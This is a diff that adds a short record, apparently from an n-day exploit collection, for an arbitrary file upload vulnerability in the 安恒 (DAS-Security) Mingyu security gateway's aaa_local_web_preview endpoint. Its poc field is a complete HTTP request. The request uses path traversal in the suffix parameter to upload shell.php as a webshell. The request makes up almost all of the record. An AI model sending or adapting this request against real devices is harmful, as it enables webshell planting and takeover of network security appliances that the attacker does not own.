@@ -1,0 +1,7 @@
+vendor = "安恒"
+name = "安恒明御安全网关 aaa_local_web_preview 文件上传漏洞"
+type = "任意文件上传"
+source = "TG"
+date = "08.14"
+poc = "POST /webui/?g=aaa_local_web_preview&name=123&read=0&suffix=/../../../shell.php HTTP/1.1 Host: User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15 Accept-Encoding: gzip Content-Length: 671 --849978f98abe41119122148e4aa65b1a Content-Disposition: form-data; name=\"shell\"; filename=\"shell.php\" Content-Type: text/plain <?php php 马?> --849978f98abe41119122148e4aa65b1a"
+label = "nday"
